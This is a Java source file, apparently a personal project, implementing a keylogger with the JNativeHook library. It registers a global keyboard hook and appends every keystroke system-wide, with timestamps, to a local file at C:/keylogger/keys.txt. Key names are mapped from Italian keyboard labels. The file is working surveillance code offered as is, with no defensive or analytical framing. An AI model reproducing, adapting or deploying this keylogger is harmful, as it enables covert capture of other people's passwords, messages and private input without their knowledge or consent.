package msolivo;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import java.io.IOException;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;
import java.sql.Timestamp;
import java.util.Date;

/**
 * @author matteosolivo
 */
public class KeyLogger implements NativeKeyListener {

	private static final Path file = Paths.get("C:/keylogger/keys.txt");
	//private static final Path file = Paths.get("/home/matteosolivo/Documenti/Technology/Java/Keylogger/src/keys.txt");
	// WINDOWS: C:/keylogger/keys.txt
	// LINUX: /home/matteosolivo/Documenti/Technology/Java/Keylogger/src/keys.txt

	//private static final Logger logger = LoggerFactory.getLogger(KeyLogger.class);
	public static void main(String[] args) {
		//logger.info("Key logger has been started");

		init();

		try {
			GlobalScreen.registerNativeHook();

		} catch (NativeHookException e) {
			//logger.error(e.getMessage(), e);
			System.exit(-1);
		}

		// ACTIVATE GLOBAL LINTENER
		GlobalScreen.addNativeKeyListener(new KeyLogger());

	}

	private static void init() {
		
		// Get the logger for "org.jnativehook" and set the level to warning.
		//java.util.logging.Logger logger = java.util.logging.Logger.getLogger(GlobalScreen.class.getPackage().getName());
		//logger.setLevel(Level.WARNING);

		// Don't forget to disable the parent handlers.
		//logger.setUseParentHandlers(false);
	}

	public void nativeKeyPressed(NativeKeyEvent e) {
		String keyText = NativeKeyEvent.getKeyText(e.getKeyCode());

		Timestamp timestamp = new Timestamp(System.currentTimeMillis());
		Date date = new Date();
		Timestamp datetime = new Timestamp(date.getTime());
		
		try (
				OutputStream os = Files.newOutputStream(
						file, StandardOpenOption.CREATE, StandardOpenOption.WRITE, StandardOpenOption.APPEND
				);

			 PrintWriter writer = new PrintWriter(os)) {

			if (keyText.length() > 1) {
				if (keyText.contains("Invio")) {
					writer.println("\n[" + datetime.toString() + "]\n");
				} else if (keyText.contains("Barra spaziatrice")) {
					writer.print(" ");
				} else if (keyText.contains("Backspace")) {
					writer.print("#");
				} else if (keyText.contains("Ctrl")) {
					writer.print("[" + keyText + "]");
				} else if (keyText.contains("Alt")) {
					writer.print("[" + keyText + "]");
				} else if (keyText.contains("Stamp")) {
					writer.print("*");
				} else if (keyText.contains("Ins")) {
					writer.print("/");
				} else if (keyText.contains("InvioSconosciuto keyCode: 0xe4a")) {
					writer.print("-");
				} else if (keyText.contains("Parentesi quadra aperta")) {
					writer.print("??");
				}
			} else {
				writer.print(keyText);
			}
			writer.print("[-" + keyText + "-]");


		} catch (IOException ex) {
			//logger.error(ex.getMessage(), ex);
			System.exit(-1);
		}
	}

	public void nativeKeyReleased(NativeKeyEvent e) {
		// Nothing
	}

	public void nativeKeyTyped(NativeKeyEvent e) {
		// Nothing here
	}
}
